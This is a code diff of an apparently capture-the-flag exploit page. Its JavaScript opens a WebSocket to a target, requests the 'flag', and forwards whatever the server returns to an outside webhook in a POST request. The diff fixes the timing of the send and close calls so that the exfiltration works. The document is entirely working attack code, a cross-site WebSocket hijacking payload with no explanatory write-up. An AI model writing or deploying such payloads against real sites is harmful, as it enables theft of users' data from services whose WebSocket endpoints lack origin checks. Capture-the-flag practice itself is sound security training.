@@ -19,36 +19,37 @@
         // Create a new WebSocket connection
         const socket = new WebSocket(websocketURL);
 
-        let flag= ''
+        let flag = '';  // Declare a variable to store the received flag
+
         function sendMessage(message) {
-              if (socket.readyState === WebSocket.OPEN) {
-                   socket.send(message);
-              } else {
-                    console.error("WebSocket connection not open!");
-              }
+            if (socket.readyState === WebSocket.OPEN) {
+                socket.send(message);  // Send message to WebSocket server
+            } else {
+                console.error("WebSocket connection not open!");
+            }
         }
-        sendMessage("flag");
 
-        // Open WebSocket connection and send "flag" when connected
+        // Send "flag" message once WebSocket is open
+        socket.addEventListener("open", () => {
+            sendMessage("flag");
+        });
+
+        // Handle message received from WebSocket
         socket.addEventListener("message", (event) => {
-    // Store the message in the 'flag' variable
-        flag = event.data;
+            // Store the message in the 'flag' variable
+            flag = event.data;
+            console.log("Message from server: ", flag);
 
-    // Log the received message (optional)
-        console.log("Message from server: ", flag);
-
-    // Now you can use the flag for further processing, for example, send it to a webhook
-        if (flag && flag.trim().length > 0) {
-            sendPostToWebhook(flag);
-        } else {
+            // Check if the flag is non-empty and send to webhook
+            if (flag && flag.trim().length > 0) {
+                sendPostToWebhook(flag);
+            } else {
                 console.log("Received empty flag, not sending POST request.");
             }
-        });
-        // Handle message received from WebSocket
 
-        socket.close();
-        sendPostToWebhook(flag);
-        socket.close();
+            // Optionally close the WebSocket after receiving the message
+            socket.close();
+        });
 
         // Function to send POST request to Webhook
         function sendPostToWebhook(flag) {
